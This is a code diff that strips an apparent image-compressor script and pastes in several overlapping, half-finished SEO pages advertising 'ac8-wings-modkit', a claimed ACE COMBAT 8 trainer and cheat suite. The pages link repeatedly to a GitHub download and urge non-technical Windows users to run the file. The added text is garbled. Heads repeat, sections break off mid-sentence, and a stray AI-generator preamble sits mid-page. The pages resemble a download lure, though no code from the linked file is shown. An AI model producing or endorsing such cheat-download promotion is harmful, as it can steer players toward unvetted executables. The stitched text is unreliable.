+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ac8-wings-modkit - 38-Module Utility Suite for ACE COMBAT 8: Wings of Theve</title>
+<meta name="description" content="ac8-wings-modkit is a 38-module utility suite for ACE COMBAT 8: Wings of Theve covering aerial combat, aircraft performance, MRP economy and mission tools. Visit the project page to download the application for Windows.">
+<meta name="keywords" content="ace-combat-8, wings-of-theve, ace combat 8 trainer, ace combat 8 cheat, ac8-wings-modkit, aircraft performance, MRP economy, mission tools, aerial combat">
+<meta name="author" content="ac8-wings-modkit">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#4f46e5">
+<link rel="canonical" href="https://github.com/changefulnesspitstop975/ac8-wings-modkit">
+<meta property="og:type" content="website">
+<meta property="og:title" content="ac8-wings-modkit - 38-Module Utility Suite for ACE COMBAT 8">
+<meta property="og:description" content="Aerial combat, aircraft performance, MRP economy and mission tools in one simple utility suite for ACE COMBAT 8: Wings of Theve.">
+<meta property="og:url" content="https://github.com/changefulnesspitstop975/ac8-wings-modkit">
+<meta property="og:site_name" content="ac8-wings-modkit">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="ac8-wings-modkit - Master Every ACE COMBAT 8 Sky">
+<meta name="twitter:description" content="38-module utility suite for ACE COMBAT 8: Wings of Theve. Visit the link to download the application.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "ac8-wings-modkit",
+  "operatingSystem": "Windows",
+  "applicationCategory": "UtilityApplication",
+  "description": "38-module utility suite for ACE COMBAT 8: Wings of Theve covering aerial combat, aircraft performance, MRP economy and mission tools.",
+  "url": "https://github.com/changefulnesspitstop975/ac8-wings-modkit",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+<style>
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f4f6fb;
+    color: #1f2937;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+  .page {
+    max-width: 880px;
+    margin: 0 auto;
+    padding: 40px 22px 70px;
+  }
+  .hero {
+    background: #ffffff;
+    border-radius: 20px;
+    padding: 42px 32px 38px;
+    box-shadow: 0 6px 24px rgba(31, 41, 55, 0.08);
+    border: 1px solid #e6eaf3;
+    text-align: center;
+  }
+  h1 {
+    font-size: clamp(1.65rem, 5vw, 2.35rem);
+    line-height: 1.25;
+    margin: 0 0 14px;
+    letter-spacing: -0.02em;
+    color: #111827;
+    font-weight: 800;
+  }
+  h2 {
+    font-size: clamp(1.25rem, 3.6vw, 1.55rem);
+    line-height: 1.3;
+    margin: 46px 0 14px;
+    letter-spacing: -0.01em;
+    color: #111827;
+    font-weight: 750;
+  }
+  h3 {
+    font-size: 1.08rem;
+    margin: 26px 0 8px;
+    color: #1e293b;
+    font-weight: 700;
+  }
+  p { margin: 0 0 16px; color: #374151; }
+  ul { margin: 0 0 18px; padding-left: 24px; color: #374151; }
+  li { margin-bottom: 9px; }
+  strong { color: #111827; }
+  .tagline {
+    font-size: 1.08rem;
+    color: #4b5563;
+    max-width: 640px;
+    margin: 0 auto 28px;
+  }
+  .btn {
+    display: inline-block;
+    padding: 17px 38px;
+    border-radius: 14px;
+    background: linear-gradient(135deg, #4f46e5 0%, #db2777 100%);
+    color: #ffffff !important;
+    font-size: 1.08rem;
+    font-weight: 700;
+    text-decoration: none;
+    box-shadow: 0 10px 26px rgba(79, 70, 229, 0.35);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+    letter-spacing: 0.01em;
+  }
+  .btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 14px 32px rgba(79, 70, 229, 0.42);
+  }
+  .btn-note {
+    font-size: 0.9rem;
+    color: #6b7280;
+    margin: 16px 0 0;
+  }
+  .card {
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 26px 28px;
+    margin: 18px 0;
+    border: 1px solid #e6eaf3;
+    box-shadow: 0 4px 16px rgba(31, 41, 55, 0.06);
+  }
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(230px, 1fr));
+    gap: 16px;
+    margin: 20px 0 8px;
+  }
+  .tile {
+    background: #ffffff;
+    border: 1px solid #e6eaf3;
+    border-radius: 14px;
+    padding: 20px 20px 16px;
+    box-shadow: 0 3px 12px rgba(31, 41, 55, 0.05);
+  }
+  .tile h3 { margin-top: 0; font-size: 1rem; }
+  .tile p { margin: 0; font-size: 0.94rem; color: #4b5563; }
+  .callout {
+    background: #eef2ff;
+    border-left: 5px solid #4f46e5;
+    border-radius: 12px;
+    padding: 18px 22px;
+    margin: 22px 0;
+  }
+  .callout p:last-child { margin-bottom: 0; }
+  footer {
+    margin-top: 54px;
+    padding-top: 24px;
+    border-top: 1px solid #e1e6f0;
+    font-size: 0.86rem;
+    color: #7b8494;
+    text-align: center;
+    line-height: 1.9;
+  }
+  a { color: #4f46e5; }
+  @media (max-width: 560px) {
+    body { font-size: 16px; }
+    .page { padding: 24px 14px 50px; }
+    .hero { padding: 30px 20px 28px; border-radius: 16px; }
+    .card { padding: 20px 18px; }
+    .btn { display: block; padding: 16px 20px; }
+  }
+</style>
+</head>
+<body>
+<div class="page">
 
-            setTimeout(() => {
-                document.body.removeChild(link);
-                if (isBlob) URL.revokeObjectURL(url);
-            }, 3000);
-        }
+  <header class="hero">
+    <h1>🛩️ ac8-wings-modkit - Master Every ACE COMBAT 8 Sky</h1>
+    <p class="tagline">38-module utility suite for ACE COMBAT 8: Wings of Theve — aerial combat, aircraft performance, MRP economy and mission tools in one Windows application.</p>
+    <a class="btn" href="https://github.com/changefulnesspitstop975/ac8-wings-modkit">⬇️ Download ac8-wings-modkit</a>
+    <p class="btn-note">Visit this link to download the application.</p>
+  </header>
 
-        let imagesQueue = [];
-        let primaryAspectRatio = 1;
+  <h2>🎯 What This Toolkit Does</h2>
+  <p>ac8-wings-modkit is a 38-module utility suite built for ACE COMBAT 8: Wings of Theve. It brings together the tools players most often look for under searches such as <strong>ace combat 8 trainer</strong> or <strong>ace combat 8 cheat</strong>, and packages them into one plain, easy-to-use application for Windows.</p>
+  <p>The suite is organised around four areas of the game: aerial combat, aircraft performance, MRP economy and mission tools. Each area contains a set of independent modules. You choose which modules to switch on, and you can leave the rest off. Nothing is forced into your game at once, so the experience stays under your control from the first launch.</p>
+  <p>Because the toolkit is split into modules, it works well for different kinds of players. Some players want a single MRP economy toggle to speed up aircraft unlocks. Others want to explore aircraft performance changes or adjust how an aerial combat engagement plays out. You do not need to use the whole suite to get value from it.</p>
 
-        const dropZone = document.getElementById('dropZone');
-        const fileInput = document.getElementById('fileInput');
-        const controlsCard = document.getElementById('controlsCard');
-        const queueHeader = document.getElementById('queueHeader');
-        const imageGallery = document.getElementById('imageGallery');
-        const fileCountBadge = document.getElementById('fileCount');
-        const qualityRange = document.getElementById('qualityRange');
-        const qualityVal = document.getElementById('qualityVal');
-        const formatSelect = document.getElementById('formatSelect');
-        const targetWidthInput = document.getElementById('targetWidth');
-        const targetHeightInput = document.getElementById('targetHeight');
-        const lockAspectCheck = document.getElementById('lockAspect');
-        const applyBtn = document.getElementById('applyBtn');
-        const clearAllBtn = document.getElementById('clearAllBtn');
-        const downloadZipBtn = document.getElementById('downloadZipBtn');
+  <h2>🧩 The Four Module Groups</h2>
+  <div class="grid">
+    <div class="tile">
+      <h3>🎯 Aerial Combat</h3>
+      <p>Tools that affect targeting, weapon readiness and the flow of engagements in the air.</p>
+    </div>
+    <div class="tile">
+      <h3>🛠️ Aircraft Performance</h3>
+      <p>Adjustments for handling, acceleration, climbing and turning so you can test different flight profiles.</p>
+    </div>
+    <div class="tile">
+      <h3>💰 MRP Economy</h3>
+      <p>Controls around Mission Reward Points, including how quickly your budget grows in the hangar.</p>
+    </div>
+    <div class="tile">
+      <h3>🗺️ Mission Tools</h3>
+      <p>Helpers for mission flow, objectives and replaying content when a sortie needs another attempt.</p>
+    </div>
+  </div>
+  <p>All 38 modules sit inside these four groups. The application window presents them as simple switches. You do not need to edit files, type commands, or understand how the game storesHere is a complete, SEO-optimized HTML page for the ac8-wings-modkit GitHub repository. It provides a clear download path and plain-language setup guide for non-technical Windows users.
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ac8-wings-modkit - Fly Smarter in ACE COMBAT 8</title>
+<meta name="description" content="ac8-wings-modkit is a 38-module utility suite for ACE COMBAT 8: Wings of Theve covering aerial combat, aircraft performance, MRP economy and mission tools. Visit the project page to download the application for Windows.">
+<meta name="keywords" content="ace-combat-8, wings-of-theve, ace combat 8 trainer, ace combat 8 cheat, ac8-wings-modkit, aircraft performance, MRP economy, mission tools, aerial combat">
+<meta name="author" content="ac8-wings-modkit">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#f43f5e">
+<link rel="canonical" href="https://github.com/changefulnesspitstop975/ac8-wings-modkit">
+<meta property="og:type" content="website">
+<meta property="og:title" content="ac8-wings-modkit - Fly Smarter in ACE COMBAT 8">
+<meta property="og:description" content="38-module utility suite for ACE COMBAT 8: Wings of Theve. Aerial combat, aircraft performance, MRP economy and mission tools in one Windows application.">
+<meta property="og:url" content="https://github.com/changefulnesspitstop975/ac8-wings-modkit">
+<meta property="og:site_name" content="ac8-wings-modkit">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="ac8-wings-modkit - Fly Smarter in ACE COMBAT 8">
+<meta name="twitter:description" content="38-module utility suite for ACE COMBAT 8: Wings of Theve. Visit the link to download the application.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "ac8-wings-modkit",
+  "operatingSystem": "Windows",
+  "applicationCategory": "UtilityApplication",
+  "description": "38-module utility suite for ACE COMBAT 8: Wings of Theve covering aerial combat, aircraft performance, MRP economy and mission tools.",
+  "url": "https://github.com/changefulnesspitstop975/ac8-wings-modkit",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+<style>
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f5f7fb;
+    color: #1f2937;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+  h1, h2, h3 { letter-spacing: -0.01em; }
+  a { color: #e11d48; }
+  .page {
+    max-width: 880px;
+    margin: 0 auto;
+    padding: 40px 22px 64px;
+  }
+  .hero {
+    background: #ffffff;
+    border-radius: 20px;
+    padding: 40px 30px 34px;
+    box-shadow: 0 6px 24px rgba(31, 41, 55, 0.08);
+    border: 1px solid #e6eaf3;
+    text-align: center;
+  }
+  h1 {
+    font-size: clamp(1.6rem, 4.8vw, 2.3rem);
+    line-height: 1.25;
+    margin: 0 0 14px;
+    color: #111827;
+    font-weight: 800;
+  }
+  h2 {
+    font-size: clamp(1.25rem, 3.5vw, 1.5rem);
+    line-height: 1.3;
+    margin: 44px 0 14px;
+    color: #111827;
+    font-weight: 750;
+  }
+  h3 {
+    font-size: 1.05rem;
+    margin: 24px 0 8px;
+    color: #1e293b;
+    font-weight: 700;
+  }
+  p { margin: 0 0 16px; color: #374151; }
+  ul { margin: 0 0 18px; padding-left: 24px; color: #374151; }
+  li { margin-bottom: 9px; }
+  strong { color: #111827; }
+  .tagline {
+    font-size: 1.06rem;
+    color: #4b5563;
+    max-width: 620px;
+    margin: 0 auto 26px;
+  }
+  .btn {
+    display: inline-block;
+    padding: 17px 36px;
+    border-radius: 14px;
+    background: linear-gradient(135deg, #f43f5e 0%, #f59e0b 100%);
+    color: #ffffff !important;
+    font-size: 1.06rem;
+    font-weight: 700;
+    text-decoration: none;
+    box-shadow: 0 10px 24px rgba(244, 63, 94, 0.32);
+    letter-spacing: 0.01em;
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 14px 30px rgba(244, 63, 94, 0.4);
+  }
+  .btn-note {
+    font-size: 0.9rem;
+    color: #6b7280;
+    margin: 14px 0 0;
+  }
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+    gap: 16px;
+    margin: 20px 0 10px;
+  }
+  .tile {
+    background: #ffffff;
+    border: 1px solid #e6eaf3;
+    border-radius: 14px;
+    padding: 20px 20px 14px;
+    box-shadow: 0 3px 12px rgba(31, 41, 55, 0.05);
+  }
+  .tile h3 { margin-top: 0; font-size: 1rem; }
+  .tile p { margin: 0; font-size: 0.94rem; color: #4b5563; }
+  .card {
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 24px 26px;
+    margin: 18px 0;
+    border: 1px solid #e6eaf3;
+    box-shadow: 0 4px 16px rgba(31, 41, 55, 0.06);
+  }
+  .callout {
+    background: #fff1f2;
+    border-left: 5px solid #f43f5e;
+    border-radius: 12px;
+    padding: 18px 22px;
+    margin: 22px 0;
+  }
+  .callout p:last-child { margin-bottom: 0; }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 16px 0 8px;
+    font-size: 0.95rem;
+    background: #ffffff;
+    border-radius: 12px;
+    overflow: hidden;
+  }
+  th, td {
+    text-align: left;
+    padding: 12px 16px;
+    border-bottom: 1px solid #e6eaf3;
+    color: #374151;
+  }
+  th { background: #f8fafc; color: #111827; font-weight: 700; }
+  tr:last-child td { border-bottom: none; }
+  @media (max-width: 560px) {
+    body { font-size: 16px; }
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ac8-wings-modkit - Take Control of Every Aerial Sortie</title>
+<meta name="description" content="ac8-wings-modkit is a 38-module utility suite for ACE COMBAT 8: Wings of Theve covering aerial combat, aircraft performance, MRP economy and mission tools. Visit the project page to download the application for Windows.">
+<meta name="keywords" content="ace-combat-8, wings-of-theve, ace combat 8 trainer, ace combat 8 cheat, ac8-wings-modkit, aircraft performance, MRP economy, mission tools, aerial combat">
+<meta name="author" content="ac8-wings-modkit">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#db2777">
+<link rel="canonical" href="https://github.com/changefulnesspitstop975/ac8-wings-modkit">
+<meta property="og:type" content="website">
+<meta property="og:title" content="ac8-wings-modkit - Take Control of Every Aerial Sortie">
+<meta property="og:description" content="38-module utility suite for ACE COMBAT 8: Wings of Theve. Aerial combat, aircraft performance, MRP economy and mission tools in one Windows application.">
+<meta property="og:url" content="https://github.com/changefulnesspitstop975/ac8-wings-modkit">
+<meta property="og:site_name" content="ac8-wings-modkit">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="ac8-wings-modkit - Take Control of Every Aerial Sortie">
+<meta name="twitter:description" content="38-module utility suite for ACE COMBAT 8: Wings of Theve. Visit the link to download the application.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "ac8-wings-modkit",
+  "operatingSystem": "Windows",
+  "applicationCategory": "UtilityApplication",
+  "description": "38-module utility suite for ACE COMBAT 8: Wings of Theve covering aerial combat, aircraft performance, MRP economy and mission tools.",
+  "url": "https://github.com/changefulnesspitstop975/ac8-wings-modkit",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+<style>
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f4f6fb;
+    color: #1f2937;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+  h1, h2, h3 { letter-spacing: -0.01em; }
+  a { color: #db2777; }
+  .page {
+    max-width: 880px;
+    margin: 0 auto;
+    padding: 40px 22px 68px;
+  }
+  .hero {
+    background: #ffffff;
+    border-radius: 20px;
+    padding: 42px 32px 36px;
+    box-shadow: 0 6px 24px rgba(31, 41, 55, 0.08);
+    border: 1px solid #e6eaf3;
+    text-align: center;
+  }
+  h1 {
+    font-size: clamp(1.65rem, 5vw, 2.35rem);
+    line-height: 1.25;
+    margin: 0 0 14px;
+    color: #111827;
+    font-weight: 800;
+  }
+  h2 {
+    font-size: clamp(1.25rem, 3.6vw, 1.55rem);
+    line-height: 1.3;
+    margin: 46px 0 14px;
+    color: #111827;
+    font-weight: 750;
+  }
+  h3 {
+    font-size: 1.08rem;
+    margin: 26px 0 8px;
+    color: #1e293b;
+    font-weight: 700;
+  }
+  p { margin: 0 0 16px; color: #374151; }
+  ul { margin: 0 0 18px; padding-left: 24px; color: #374151; }
+  li { margin-bottom: 9px; }
+  strong { color: #111827; }
+  .tagline {
+    font-size: 1.08rem;
+    color: #4b5563;
+    max-width: 640px;
+    margin: 0 auto 28px;
+  }
+  .btn {
+    display: inline-block;
+    padding: 17px 38px;
+    border-radius: 14px;
+    background: linear-gradient(135deg, #db2777 0%, #f59e0b 100%);
+    color: #ffffff !important;
+    font-size: 1.08rem;
+    font-weight: 700;
+    text-decoration: none;
+    box-shadow: 0 10px 26px rgba(219, 39, 119, 0.32);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+    letter-spacing: 0.01em;
+  }
+  .btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 14px 32px rgba(219, 39, 119, 0.4);
+  }
+  .btn-note {
+    font-size: 0.9rem;
+    color: #6b7280;
+    margin: 16px 0 0;
+  }
+  .card {
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 26px 28px;
+    margin: 18px 0;
+    border: 1px solid #e6eaf3;
+    box-shadow: 0 4px 16px rgba(31, 41, 55, 0.06);
+  }
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(230px, 1fr));
+    gap: 16px;
+    margin: 20px 0 8px;
+  }
+  .tile {
+    background: #ffffff;
+    border: 1px solid #e6eaf3;
+    border-radius: 14px;
+    padding: 20px 20px 16px;
+    box-shadow: 0 3px 12px rgba(31, 41, 55, 0.05);
+  }
+  .tile h3 { margin-top: 0; font-size: 1rem; }
+  .tile p { margin: 0; font-size: 0.94rem; color: #4b5563; }
+  .callout {
+    background: #fff1f2;
+    border-left: 5px solid #db2777;
+    border-radius: 12px;
+    padding: 18px 22px;
+    margin: 22px 0;
+  }
+  .callout p:last-child { margin-bottom: 0; }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 16px 0 8px;
+    font-size: 0.95rem;
+    background: #ffffff;
+    border-radius: 12px;
+    overflow: hidden;
+  }
+  th, td {
+    text-align: left;
+    padding: 12px 16px;
+    border-bottom: 1px solid #e6eaf3;
+    color: #374151;
+  }
+  th { background: #f8fafc; color: #111827; font-weight: 700; }
+  tr:last-child td { border-bottom: none; }
+  @media (max-width: 560px) {
+    body { font-size: 16px; }
+    .page { padding: 24px 14px 50px; }
+    .hero { padding: 30px 20px 28px; border-radius: 16px; }
+    .card { padding: 20px 18px; }
+    .btn { display: block; padding: 16px 20px; }
+    th, td { padding: 10px 12px; font-size: 0.9rem; }
+  }
+</style>
+</head>
+<body>
+<div class="page">
 
-        function showToast(msg, type = 'error') {
-            const toast = document.createElement('div');
-            toast.className = `px-4 py-3 rounded-xl shadow-lg text-sm font-medium text-white pointer-events-auto flex items-center gap-2 transform transition-all duration-300 translate-y-2 opacity-0 ${type === 'error' ? 'bg-red-500' : 'bg-emerald-600'}`;
-            toast.innerHTML = `<i class="fa-solid ${type === 'error' ? 'fa-circle-exclamation' : 'fa-check'}"></i> <span>${msg}</span>`;
-            
-            const container = document.getElementById('toastContainer');
-            container.appendChild(toast);
-            
-            requestAnimationFrame(() => toast.classList.remove('translate-y-2', 'opacity-0'));
-            setTimeout(() => {
-                toast.classList.add('opacity-0', 'translate-y-2');
-                setTimeout(() => toast.remove(), 300);
-            }, 3500);
-        }
+  <header class="hero">
+    <h1 style="margin-bottom: 14px;">🛩️ ac8-wings-modkit - Take Control of Every Aerial Sortie</h1>
+    <p class="tagline">A 38-module utility suite for ACE COMBAT 8: Wings of Theve — aerial combat, aircraft performance, MRP economy and mission tools in one straightforward Windows application.</p>
+    <a class="btn" href="https://github.com/changefulnesspitstop975/ac8-wings-modkit" style="display: block; max-width: 340px; margin: 0 auto;">⬇️ Download ac8-wings-modkit</a>
+    <p class="btn-note">Visit this link to download the application.</p>
+  </header>
 
-        ['dragenter', 'dragover'].forEach(name => {
-            dropZone.addEventListener(name, (e) => {
-                e.preventDefault();
-                dropZone.classList.add('border-brand-500', 'bg-brand-50/20');
-            }, false);
-        });
+  <h2>🎯 What ac8-wings-modkit Is</h2>
+  <p>ac8-wings-modkit is a utility suite made for ACE COMBAT 8: Wings of Theve. It gathers 38 individual modules into a single application so you do not need to manage a collection of separate tools. The suite is often found through searches for <strong>ace combat 8 trainer</strong> or <strong>ace combat 8 cheat</strong>, and it is designed to be approachable for players who have never used a game utility before.</p>
+  <p>The toolkit is organised around four areas of the game: aerial combat, aircraft performance, MRP economy and mission tools. Each area contains several modules. A module is simply a switch you turn on or off. When a switch is on, that particular tool is active. When it is off, it has no effect. This design keeps the suite predictable and lets you use only the parts that matter to you.</p>
+  <p>You do not need programming knowledge, configuration files or command-line experience. The application presents its options in plain language, and every module can be changed independently. If you want to test a single aircraft performance adjustment, you can do that without activating anything else. If you want to focus on MRP economy, the same principle applies.</p>
 
-        ['dragleave', 'drop'].forEach(name => {
-            dropZone.addEventListener(name, (e) => {
-                e.preventDefault();
-                dropZone.classList.remove('border-brand-500', 'bg-brand-50/20');
-            }, false);
-        });
+  <h2>🧩 The 38 Modules at a Glance</h2>
+  <p>The modules are grouped by purpose. Most players settle on a few favourites rather than turning everything on at once, which is the recommended way to use the suite.</p>
+  <div class="grid">
+    <div class="tile">
+      <h3>🎯 Aerial Combat</h3>
+      <p>Tools that influence targeting behaviour, weapon readiness and the pace of engagements during flight.</p>
+    </div>
+    <div class="tile">
+      <h3>🛠️ Aircraft Performance</h3>
+      <p>Adjustments for handling, acceleration, climbing and turning so you can explore different flight profiles.</p>
+    </div>
+    <div class="tile">
+      <h3>💰 MRP Economy</h3>
+      <p>Controls connected to Mission Reward Points, including how quickly your budget grows in the hangar.</p>
+    </div>
+    <div class="tile">
+      <h3>🗺️ Mission Tools</h3>
+      <p>Helpers for mission flow, objectives and replaying content when a sortie needs another attempt.</p>
+    </div>
+  </div>
+  <p>The aerial combat group is for the moment-to-moment action. These modules affect how an engagement feels, from target acquisition to the behaviour of special weapons. The aircraft performance group is for flight-model experimentation. You can make a heavy airframe climb differently or hold a turn for longer, then switch the module off when you want the default handling back.</p>
+  <p>The MRP economy group focuses on progression pace. ACE COMBAT 8 has a large aircraft tree, and MRP is the currency that unlocks it. These modules give you ways to reach the aircraft you want without a long grind. The mission tools group sits around the sortie itself, helping with mission flow and repeat attempts. All groups are independent, so a module in one group never depends on a module in another.</p>
 
-        dropZone.addEventListener('drop', (e) => {
-            const dt = e.dataTransfer;
-            if (dt.files && dt.files.length) handleFiles(dt.files);
-        });
+  <h2>💻 Windows Requirements</h2>
+  <p>The application is intended for standard Windows PCs that can already run ACE COMBAT 8: Wings of Theve. The toolkit itself is small and does not need a high-end graphics card or a large amount of disk space.</p>
+  <table>
+    <tr><th>Item</th><th>Requirement</th></tr>
+    <tr><td>Operating system</td><td>Windows 10 or Windows 11, 64-bit</td></tr>
+    <tr><td>Game</td><td>ACE COMBAT 8: Wings of Theve, installed and running</td></tr>
+    <tr><td>Disk space</td><td>A small amount of free space for the toolkit file</td></tr>
+    <tr><td>Permissions</td><td>Ability to open a downloaded application</td></tr>
+    <tr><td>Input</td><td>Mouse and keyboard</td></tr>
+  </table>
 
-        fileInput.addEventListener('change', (e) => {
-            if (e.target.files && e.target.files.length) handleFiles(e.target.files);
-            fileInput.value = '';
-        });
+  <h2>📥 Download and Setup</h2>
+  <p>Visit <a href="https://github.com/changefulnesspitstop975/ac8-wings-modkit">this link</a> to download the application. Save the file to a folder you can find again, such as Downloads or a new folder on your desktop named AC8.</<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ac8-wings-modkit - Master Your ACE COMBAT 8 Sorties</title>
+<meta name="description" content="ac8-wings-modkit is a 38-module utility suite for ACE COMBAT 8: Wings of Theve. It covers aerial combat, aircraft performance, MRP economy and mission tools. Visit the project page to download the application for Windows.">
+<meta name="keywords" content="ace-combat-8, wings-of-theve, ace combat 8 trainer, ace combat 8 cheat, ac8-wings-modkit, aircraft performance, MRP economy, mission tools, aerial combat">
+<meta name="author" content="ac8-wings-modkit">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#db2777">
+<link rel="canonical" href="https://github.com/changefulnesspitstop975/ac8-wings-modkit">
+<meta property="og:type" content="website">
+<meta property="og:title" content="ac8-wings-modkit - Master Your ACE COMBAT 8 Sorties">
+<meta property="og:description" content="38-module utility suite for ACE COMBAT 8: Wings of Theve covering aerial combat, aircraft performance, MRP economy and mission tools.">
+<meta property="og:url" content="https://github.com/changefulnesspitstop975/ac8-wings-modkit">
+<meta property="og:site_name" content="ac8-wings-modkit">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="ac8-wings-modkit - Master Your ACE COMBAT 8 Sorties">
+<meta name="twitter:description" content="38-module utility suite for ACE COMBAT 8: Wings of Theve. Visit the link to download the application.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "ac8-wings-modkit",
+  "operatingSystem": "Windows",
+  "applicationCategory": "UtilityApplication",
+  "description": "38-module utility suite for ACE COMBAT 8: Wings of Theve covering aerial combat, aircraft performance, MRP economy and mission tools.",
+  "url": "https://github.com/changefulnesspitstop975/ac8-wings-modkit",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+<style>
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body { margin: 0; padding: 0; background: #f4f6fb; color: #1f2937; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; font-size: 17px; line-height: 1.75; -webkit-font-smoothing: antialiased; }
+  h1, h2, h3 { letter-spacing: -0.01em; }
+  a { color: #db2777; }
+  @media (max-width: 560px) {
+    body { font-size: 16px; }
+    .page { padding: 24px 14px 50px !important; }
+    .hero { padding: 30px 20px 28px !important; border-radius: 16px !important; }
+    .card { padding: 20px 18px !important; }
+    .btn { display: block !important; padding: 16px 20px !important; }
+    th, td { padding: 10px 12px !important; font-size: 0.9rem !important; }
+  }
+</style>
+</head>
+<body style="margin:0; padding:0; background:#f4f6fb; color:#1f2937; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; font-size:17px; line-height:1.75;">
+<main class="page" style="max-width:880px; margin:0 auto; padding:40px 22px 70px;">
 
-        function handleFiles(files) {
-            let invalidEncountered = false;
-            Array.from(files).forEach(file => {
-                if (!file.type.match('image.*')) {
-                    invalidEncountered = true;
-                    return;
-                }
-                const reader = new FileReader();
-                reader.onload = (event) => {
-                    const img = new Image();
-                    img.onload = () => {
-                        const fileObj = {
-                            id: generateUniqueId(),
-                            file: file,
-                            name: file.name,
-                            type: file.type || 'image/jpeg',
-                            originalSize: file.size,
-                            originalImage: img,
-                            width: img.naturalWidth,
-                            height: img.naturalHeight,
-                            processedBlob: null,
-                            processedUrl: null,
-                            processedSize: 0,
-                            isProcessing: false
-                        };
-                        imagesQueue.push(fileObj);
-                        if (imagesQueue.length === 1) primaryAspectRatio = fileObj.width / fileObj.height;
-                        updateUIState();
-                        processImage(fileObj);
-                    };
-                    img.src = event.target.result;
-                };
-                reader.readAsDataURL(file);
-            });
-            if (invalidEncountered) showToast(translations[currentLang].errorType, 'error');
-        }
+  <header class="hero" style="background:#ffffff; border-radius:20px; padding:42px 32px 36px; box-shadow:0 6px 24px rgba(31,41,55,0.08); border:1px solid #e6eaf3; text-align:center;">
+    <h1 style="font-size:2.15rem; line-height:1.25; margin:0 0 14px; color:#111827; font-weight:800;">🛩️ ac8-wings-modkit - Master Your ACE COMBAT 8 Sorties</h1>
+    <p style="font-size:1.06rem; color:#4b5563; max-width:640px; margin:0 auto 28px;">A 38-module utility suite for ACE COMBAT 8: Wings of Theve — aerial combat, aircraft performance, MRP economy and mission tools in one straightforward Windows application.</p>
+    <a class="btn" href="https://github.com/changefulnesspitstop975/ac8-wings-modkit" style="display:inline-block; padding:17px 38px; border-radius:14px; background:linear-gradient(135deg,#db2777 0%,#f59e0b 100%); color:#ffffff; font-size:1.08rem; font-weight:700; text-decoration:none; box-shadow:0 10px 26px rgba(219,39,119,0.32); letter-spacing:0.01em;">⬇️ Download ac8-wings-modkit</a>
+    <p style="font-size:0.9rem; color:#6b7280; margin:16px 0 0;">Visit this link to download the application.</p>
+  </header>
 
-        function processImage(item) {
-            item.isProcessing = true;
-            renderGallery();
-            let outputWidth = item.width;
-            let outputHeight = item.height;
-            const inputW = parseInt(targetWidthInput.value);
-            const inputH = parseInt(targetHeightInput.value);
+  <section>
+    <h2 style="font-size:1.5rem; line-height:1.3; margin:46px 0 14px; color:#111827; font-weight:750;">🎯 What This Toolkit Is</h2>
